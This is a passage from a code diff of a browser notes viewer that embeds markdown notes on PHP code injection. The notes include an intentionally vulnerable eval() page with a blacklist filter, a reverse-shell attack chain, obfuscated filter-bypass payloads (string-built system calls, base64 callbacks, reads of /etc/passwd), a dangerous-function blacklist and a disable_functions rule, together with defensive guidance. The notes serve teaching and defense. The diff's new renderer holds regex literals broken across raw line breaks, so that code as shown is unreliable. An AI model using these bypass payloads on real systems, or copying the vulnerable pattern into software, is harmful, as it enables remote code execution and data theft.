(shell)\n- `file_put_contents()` - Writes the payload to disk\n\n**Attack Chain:**\n\n1. Write malicious PHP file to server\n2. Access the file via HTTP\n3. Script opens connection to attacker\n4. Shell spawned over the connection\n5. Attacker has full command-line access\n\n---\n\n## 📊 Vulnerability Summary Table\n\n|Function/Payload|Description|Risk Level|Attack Type|\n|---|---|---|---|\n|`escapeshellcmd`|Sanitizes shell commands (partial protection)|🟡 Medium|Command Injection|\n|`include`, `require`|Includes PHP files|🔴 Critical|LFI/RFI|\n|`file_put_contents`|Writes data to files|🔴 High|Backdoor Creation|\n|`file_get_contents`|Reads file/URL contents|🔴 High|Info Disclosure|\n|`eval`|Executes arbitrary PHP code|🔴🔴🔴 CRITICAL|RCE|\n|`include('/etc/passwd')`|Local file inclusion attempt|🔴 High|LFI|\n|`include('http://...')`|Remote file inclusion|🔴 Critical|RFI|\n|`require('/etc/passwd')`|Same as include (local)|🔴 High|LFI|\n|`require('http://...')`|Remote file inclusion|🔴 Critical|RFI|\n|Reverse Shell Payload|Opens remote shell connection|🔴🔴🔴 CRITICAL|Remote Access|\n|File Upload Handler|Enables unvalidated uploads|🔴 High|Malware Upload|\n|`fsockopen` + `proc_open`|Creates backdoor connection|🔴🔴🔴 CRITICAL|Remote Shell|\n\n## 🚨 Flawed Mitigation Example\n\n### ❌ INSECURE CODE (Educational Example)\n\nhtml\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Code Injection</title>\n</head>\n<body>\n\n<form action=\"code-injection-8.php\" method=\"POST\">\n    Function: <input type=\"text\" name=\"fun\"><br />\n    <input type=\"submit\" name=\"run\" value=\"run\">\n</form>\n\n<pre>\n<?php\nif (isset($_POST['fun'])) {\n    $fun = $_POST['fun'];\n    \n    // ❌ FLAWED APPROACH: Blacklist filtering\n    // Check if input contains dangerous function names\n    if (!preg_match('/exec|system|shell_exec|include|require|passthru|escapeshellcmd|file_put_contents|fsockopen|proc_open|fopen|fwrite|file_get_contents|popen/i', $fun)) {\n        \n        // ❌ CRITICAL VULNERABILITY: eval() with user input\n        eval($fun . ';');\n        \n    } else {\n        // Block execution and display error\n        echo \"Error\";\n    }\n}\n?>\n</pre>\n\n</body>\n</html>\n```\n\n# bypass payloads-\n---\n\n## 📄 Screenshot 1 — Obfuscated Function Execution\n\n`$func = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $func(\"REDACTED_COMMAND\"); \n$fun = \"sy\" . \"stem\"; $fun(\"REDACTED_COMMAND\");  \ncall_user_func(     base64_decode('REDACTED'),     \"REDACTED_COMMAND\" );  register_shutdown_function(     base64_decode('REDACTED'),     base64_decode('REDACTED') );  \narray_reduce(     [],     base64_decode('REDACTED'),     base64_decode('REDACTED') );  forward_static_call_array(     base64_decode('REDACTED'),     [ base64_decode('REDACTED') ] );`\n\n### 🔍 What This Demonstrates\n\n- Obfuscation using:\n    \n    - `chr()`\n        \n    - `base64_decode()`\n        \n    - `call_user_func()`\n        \n- Multiple execution paths\n    \n- Hard-to-detect malicious logic\n    \n\n---\n\n## 📄 Screenshot 2 — Command Execution Patterns\n\n`$a = \"sys\"; $b = \"tem\"; $f = $a . $b;  $f(\"REDACTED\");  $ip = implode('.', [192, 168, 1, 7]); $f(\"REDACTED\");`\n\n### ⚠️ Risk\n\n- Function name built dynamically\n    \n- IP constructed to evade filters\n    \n- Executes OS-level commands\n    \n\n---\n\n## 📄 Screenshot 3 — File & System Access\n\n`readfile('/etc/passwd');  highlight_file(phpinfo());  show_source('/etc/passwd');  show_source('phpinfo-test.php');  getenv(); ini_get_all(); getcwd();`\n### 🔍 Why This Fails\n\n| Issue                 | Explanation                                                     |\n| --------------------- | --------------------------------------------------------------- |\n| **Blacklisting**      | Impossible to enumerate all dangerous functions                 |\n| **Bypass Techniques** | Functions can be called indirectly (e.g., variable functions)   |\n| **New Functions**     | New dangerous functions won't be blocked                        |\n| **eval() Usage**      | Using `eval()` with ANY user input is fundamentally insecure    |\n| **Regex Limitations** | Can be bypassed with encoding, concatenation, or indirect calls |\n\n### 🎭 Example Bypasses\n\nEven with this blacklist, an attacker could:\n\nphp\n\n```php\n// Bypass 1: Variable functions\n$_GET['f']($_GET['c']);\n// Access as: ?f=system&c=whoami\n\n// Bypass 2: String concatenation\n$a = 'sys' . 'tem';\n$a('whoami');\n\n// Bypass 3: Using backticks (shell execution)\n`whoami`;\n\n// Bypass 4: Using assert (older PHP)\nassert($_GET['cmd']);\n\n// Bypass 5: Indirect function calls\ncall_user_func('system', 'whoami');\n```\n\n---\n\n## ✅ Proper Security Measures\n\n### 🛡️ Defense-in-Depth Approach\n\n#### 1. **NEVER Use `eval()` with User Input**\n\nphp\n\n```php\n// ❌ NEVER DO THIS\neval($_POST['code']);\n\n// ✅ INSTEAD: Use whitelisted operations\n$allowed_operations = [\n    'add' => fn($a, $b) => $a + $b,\n    'multiply' => fn($a, $b) => $a * $b,\n];\n\nif (isset($allowed_operations[$_POST['operation']])) {\n    $result = $allowed_operations[$_POST['operation']]($a, $b);\n}\n```\n\n#### 2. **Input Validation (Whitelist Approach)**\n\nphp\n\n```php\n// ✅ Whitelist allowed values\n$allowed_actions = ['view', 'edit', 'delete'];\n$action = $_POST['action'];\n\nif (in_array($action, $allowed_actions, true)) {\n    // Process action\n} else {\n    // Reject\n    die('Invalid action');\n}\n```\n\n#### 3. **Parameterized Queries for Databases**\n\nphp\n\n```php\n// ❌ SQL Injection vulnerable\n$query = \"SELECT * FROM users WHERE id = \" . $_GET['id'];\n\n// ✅ Prepared statements\n$stmt = $pdo->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->execute([$_GET['id']]);\n```\n\n#### 4. **Secure File Operations**\n\nphp\n\n```php\n// ❌ Dangerous\ninclude($_GET['page'] . '.php');\n\n// ✅ Whitelist files\n$allowed_pages = ['home', 'about', 'contact'];\n$page = $_GET['page'];\n\nif (in_array($page, $allowed_pages, true)) {\n    include($page . '.php');\n}\n```\n\n#### 5. **Disable Dangerous PHP Functions**\n\nIn `php.ini`:\n\nini\n\n```ini\ndisable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source\n```\n\n#### 6. **Implement Proper Access Controls**\n\nphp\n\n```php\n// Verify user permissions\nif (!$user->hasPermission('admin')) {\n    http_response_code(403);\n    die('Access denied');\n}\n```\n\n#### 7. **Use Security Headers**\n\nphp\n\n```php\nheader(\"Content-Security-Policy: default-src 'self'\");\nheader(\"X-Frame-Options: DENY\");\nheader(\"X-Content-Type-Options: nosniff\");\n```\n\n#### 8. **Regular Security Audits**\n\n- Code reviews\n- Penetration testing\n- Static analysis tools (PHPStan, Psalm)\n- Dynamic analysis (OWASP ZAP, Burp Suite)\n\n---\n\n## 🎓 Key Takeaways\n\n### For Security Professionals\n\n1. **Understanding vulnerabilities** is the first step in defense\n2. **Never trust user input** - validate, sanitize, and verify everything\n3. **Use whitelisting** instead of blacklisting\n4. **Defense-in-depth** - multiple layers of security\n5. **Keep systems updated** - patch vulnerabilities promptly\n\n### Red Flags in Code\n\n🚩 Use of `eval()` with variables  \n🚩 Dynamic `include`/`require` statements  \n🚩 User input in shell commands  \n🚩 No input validation  \n🚩 Blacklist-based filtering  \n🚩 File operations with user-controlled paths\n\n---\n\n## 📚 Additional Resources\n\n### Recommended Reading\n\n- OWASP Top 10: [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)\n- PHP Security Guide: [https://phpsecurity.readthedocs.io/](https://phpsecurity.readthedocs.io/)\n- CWE-94 (Code Injection): [https://cwe.mitre.org/data/definitions/94.html](https://cwe.mitre.org/data/definitions/94.html)\n- OWASP Code Injection: [https://owasp.org/www-community/attacks/Code_Injection](https://owasp.org/www-community/attacks/Code_Injection)\n\n### Security Testing Tools\n\n- **Static Analysis:** PHPStan, Psalm, SonarQube\n- **Dynamic Testing:** OWASP ZAP, Burp Suite\n- **Penetration Testing:** Metasploit, SQLMap\n- **Code Review:** SonarCloud, CodeQL\n\n---\n\n## ⚖️ Legal and Ethical Notice\n\n**This document is provided strictly for educational purposes.**\n\n✅ **Authorized Use:**\n\n- Learning security concepts\n- Defensive security training\n- Authorized penetration testing\n- Security research with permission\n\n❌ **Unauthorized Use:**\n\n- Attacking systems without permission\n- Exploiting vulnerabilities maliciously\n- Unauthorized access to systems\n- Any illegal activities\n\n**Remember:** Unauthorized access to computer systems is illegal in most jurisdictions and can result in severe criminal penalties.\n\n---\n\n## 🔐 Conclusion\n\nUnderstanding these vulnerabilities empowers security professionals to:\n\n1. **Identify weaknesses** in code during reviews\n2. **Implement proper defenses** in applications\n3. **Test security controls** effectively\n4. **Educate developers** on secure coding practices\n\n**Security is everyone's responsibility.** By understanding attack vectors, we can build more resilient and secure systems.\n\n---\n\n_Document Version: 1.0_  \n_Last Updated: December 2025_  \n_Purpose: Educational and Defensive Security Training_"}, {"name": "steps to find code injection", "content": "# 🧠 How to Find Code Injection Vulnerabilities\n\n_(Educational & Ethical Purpose Only)_\n\n---\n\n## 🔍 1. Understand What Code Injection Is\n\n**Code Injection happens when:**\n\n- User input is executed as **code**\n    \n- The application trusts user input\n    \n- Dangerous functions are used\n    \n\n### Common Dangerous Functions\n\n|Language|Risky Functions|\n|---|---|\n|PHP|`eval()`, `system()`, `exec()`, `shell_exec()`, `assert()`|\n|Python|`eval()`, `exec()`|\n|Java|`Runtime.exec()`|\n|Node.js|`eval()`, `child_process.exec()`|\n\n---\n\n## 🧪 2. Where to Look (Very Important)\n\n### 🔹 A. Input Fields\n\nLook for:\n\n- Forms (login, search, contact)\n    \n- URL parameters\n    \n- POST requests\n    \n- File upload names\n    \n\nExample:\n\n`index.php?cmd=`\n\n---\n\n### 🔹 B. Backend Code (If You Have Access)\n\nSearch for:\n\n`eval($_GET['x']); system($_POST['cmd']); exec($input);`\n\n⚠️ These are **red flags**.\n\n---\n\n## 🔎 3. Signs of Code Injection Vulnerability\n\n### 🚩 Red Flags in Code\n\n- User input passed directly to a function\n    \n- No validation\n    \n- Dynamic function calls\n    \n- Base64 decoding user input\n    \n- String concatenation\n    \n\nExample:\n\n`$cmd = $_POST['cmd']; system($cmd);`\n\n---\n\n## 🧠 4. How to Test Safely (Educational Way)\n\n### ✔ Step 1: Observe Behavior\n\n- Does the page react differently to inputs?\n    \n- Do errors appear?\n    \n- Does output change?\n    \n\n### ✔ Step 2: Use Benign Input\n\nUse harmless test input like:\n\n`test 123 hello`\n\n📌 You are checking **behavior**, not exploitation.\n\n---\n\n## 🧪 5. Code Review Method (Best for Learning)\n\nWhen reviewing PHP code, ask:\n\n✅ Is user input used directly?  \n✅ Is eval() used?  \n✅ Is system() used?  \n✅ Is there a whitelist?  \n❌ Is there input validation?\n\nIf **NO validation + execution function = vulnerability**\n\n---\n\n## 🧩 6. Common Code Injection Patterns\n\n### ❌ Vulnerable\n\n`eval($_POST['data']);`\n\n### ✅ Secure\n\n`if ($_POST['action'] === 'info') {     phpinfo(); }`\n\n---\n\n## 🛡️ 7. How Professionals Detect It\n\n### Manual:\n\n- Read source code\n    \n- Test parameters\n    \n- Observe error messages\n    \n\n### Tools (Educational Use):\n\n- Burp Suite\n    \n- OWASP ZAP\n    \n- Static code analyzers\n    \n\n⚠️ Tools **assist**, they don’t replace thinking."}];
 
-// Build sidebar
 function buildSidebar(filter) {
   const list = document.getElementById('fileList');
   list.innerHTML = '';
   let count = 0;
-  NOTES.forEach((note, i) => {
-    if (filter && !note.name.toLowerCase().includes(filter.toLowerCase())) return;
-    const div = document.createElement('div');
+  NOTES.forEach(function(note, i) {
+    if (filter && note.name.toLowerCase().indexOf(filter.toLowerCase()) === -1) return;
+    var div = document.createElement('div');
     div.className = 'file-item';
     div.id = 'fi-' + i;
-    div.innerHTML = '<span class="fi-icon">▸</span>';
-    const span = document.createElement('span');
-    span.className = 'fi-name';
-    span.textContent = note.name; // textContent = safe, no XSS
-    div.appendChild(span);
-    div.onclick = () => openNote(i);
+    var icon = document.createElement('span');
+    icon.className = 'fi-icon';
+    icon.textContent = '▸';
+    var name = document.createElement('span');
+    name.className = 'fi-name';
+    name.textContent = note.name;
+    div.appendChild(icon);
+    div.appendChild(name);
+    div.addEventListener('click', (function(idx){ return function(){ openNote(idx); }; })(i));
     list.appendChild(div);
     count++;
   });
@@ -156,88 +136,71 @@ function filterFiles() {
   buildSidebar(document.getElementById('searchInput').value);
 }
 
-// SAFE note renderer - uses DOM API, never raw innerHTML for user content
-function openNote(idx) {
-  document.querySelectorAll('.file-item').forEach(e => e.classList.remove('active'));
-  const el = document.getElementById('fi-' + idx);
-  if (el) { el.classList.add('active'); el.scrollIntoView({block:'nearest'}); }
-  document.getElementById('vPath').textContent = 'CODE INJECTION/' + NOTES[idx].name;
-  
-  // SAFE render: parse markdown to safe HTML
-  const html = renderMd(NOTES[idx].content);
-  
-  // Use DOMParser to safely parse - strips all scripts
-  const parser = new DOMParser();
-  const doc = parser.parseFromString('<div>' + html + '</div>', 'text/html');
-  
-  // Remove ALL script, iframe, object, embed tags for safety
-  ['script','iframe','object','embed','form'].forEach(tag => {
-    doc.querySelectorAll(tag).forEach(el => el.remove());
-  });
-  
-  // Remove on* event attributes
-  doc.querySelectorAll('*').forEach(el => {
-    [...el.attributes].forEach(attr => {
-      if (attr.name.startsWith('on')) el.removeAttribute(attr.name);
-    });
-  });
-  
-  const viewer = document.getElementById('viewerContent');
-  viewer.innerHTML = '';
-  viewer.appendChild(doc.body.firstChild);
-  viewer.scrollTop = 0;
-}
-
-function renderMd(md) {
-  // Escape HTML entities FIRST - this is the key security step
-  let h = md
+function esc(str) {
+  return str
     .replace(/&/g, '&amp;')
     .replace(/</g, '&lt;')
     .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;');
-
-  // Code blocks (must be before inline code)
-  h = h.replace(/```[\w]*\n?([\s\S]*?)```/g, (_, c) => `<pre><code>${c.trim()}</code></pre>`);
-  // Inline code
-  h = h.replace(/`([^`\n]+)`/g, '<code>$1</code>');
-  // Headers
-  h = h.replace(/^#### (.+)$/gm, '<h4>$1</h4>');
-  h = h.replace(/^### (.+)$/gm, '<h3>$1</h3>');
-  h = h.replace(/^## (.+)$/gm, '<h2>$1</h2>');
-  h = h.replace(/^# (.+)$/gm, '<h1>$1</h1>');
-  // Bold + Italic
-  h = h.replace(/\*\*\*(.+?)\*\*\*/g, '<strong><em>$1</em></strong>');
-  h = h.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
-  h = h.replace(/\*(.+?)\*/g, '<em>$1</em>');
-  // HR
-  h = h.replace(/^---+$/gm, '<hr>');
-  // Blockquote
-  h = h.replace(/^&gt; (.+)$/gm, '<blockquote>$1</blockquote>');
-  // Table
-  h = h.replace(/\|(.+)\|\n\|[-| :]+\|\n((?:\|.+\|\n?)+)/g, (m, header, rows) => {
-    const ths = header.split('|').filter(s => s.trim()).map(s => `<th>${s.trim()}</th>`).join('');
-    const trs = rows.trim().split('\n').map(row => {
-      const tds = row.split('|').filter(s => s.trim()).map(s => `<td>${s.trim()}</td>`).join('');
-      return `<tr>${tds}</tr>`;
-    }).join('');
-    return `<table><thead><tr>${ths}</tr></thead><tbody>${trs}</tbody></table>`;
-  });
-  // Lists
-  h = h.replace(/^[\*\-] (.+)$/gm, '<li>$1</li>');
-  h = h.replace(/^\d+\. (.+)$/gm, '<li>$1</li>');
-  h = h.replace(/(<li>[\s\S]+?<\/li>)/g, m => `<ul>${m}</ul>`);
-  h = h.replace(/<\/ul>\s*<ul>/g, '');
-  // Links
-  h = h.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>');
-  // Obsidian links
-  h = h.replace(/\[\[([^\]]+)\]\]/g, '<span style="color:var(--yellow)">⟦$1⟧</span>');
-  // Paragraphs
-  h = h.replace(/\n\n+/g, '</p><p>');
-  h = h.replace(/\n/g, '<br>');
-  return '<p>' + h + '</p>';
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
 }
 
-// Init
+function renderMd(raw) {
+  // Step 1: Split into code blocks and text blocks
+  // Code blocks are rendered as-is (escaped), text blocks get markdown treatment
+  var parts = raw.split(/(```[\s\S]*?```|`[^`
+]+`)/g);
+  var result = '';
+  
+  for (var i = 0; i < parts.length; i++) {
+    var part = parts[i];
+    if (part.startsWith('```')) {
+      // Fenced code block - just escape, no markdown
+      var code = part.replace(/^```\w*
+?/, '').replace(/```$/, '').trim();
+      result += '<pre><code>' + esc(code) + '</code></pre>';
+    } else if (part.startsWith('`') && part.endsWith('`')) {
+      // Inline code
+      result += '<code>' + esc(part.slice(1, -1)) + '</code>';
+    } else {
+      // Regular text - escape first, then apply markdown
+      var t = esc(part);
+      t = t.replace(/^#### (.+)$/gm, '<h4>$1</h4>');
+      t = t.replace(/^### (.+)$/gm, '<h3>$1</h3>');
+      t = t.replace(/^## (.+)$/gm, '<h2>$1</h2>');
+      t = t.replace(/^# (.+)$/gm, '<h1>$1</h1>');
+      t = t.replace(/\*\*\*(.+?)\*\*\*/g, '<strong><em>$1</em></strong>');
+      t = t.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
+      t = t.replace(/\*(.+?)\*/g, '<em>$1</em>');
+      t = t.replace(/^---+$/gm, '<hr>');
+      t = t.replace(/^&gt; (.+)$/gm, '<blockquote>$1</blockquote>');
+      t = t.replace(/^[\*\-] (.+)$/gm, '<li>$1</li>');
+      t = t.replace(/^\d+\. (.+)$/gm, '<li>$1</li>');
+      t = t.replace(/(<li>[\s\S]+?<\/li>)/g, function(m){ return '<ul>' + m + '</ul>'; });
+      t = t.replace(/<\/ul>\s*<ul>/g, '');
+      t = t.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>');
+      t = t.replace(/
+
++/g, '</p><p>');
+      t = t.replace(/
+/g, '<br>');
+      result += '<p>' + t + '</p>';
+    }
+  }
+  return result;
+}
+
+function openNote(idx) {
+  document.querySelectorAll('.file-item').forEach(function(e){ e.classList.remove('active'); });
+  var el = document.getElementById('fi-' + idx);
+  if (el) { el.classList.add('active'); el.scrollIntoView({block: 'nearest'}); }
+  document.getElementById('vPath').textContent = 'CODE INJECTION/' + NOTES[idx].name;
+  var viewer = document.getElementById('viewerContent');
+  viewer.innerHTML = renderMd(NOTES[idx].content);
+  viewer.scrollTop = 0;
+}
+
+// Init on load
 buildSidebar();
 if (NOTES.length > 0) openNote(0);
 </script>
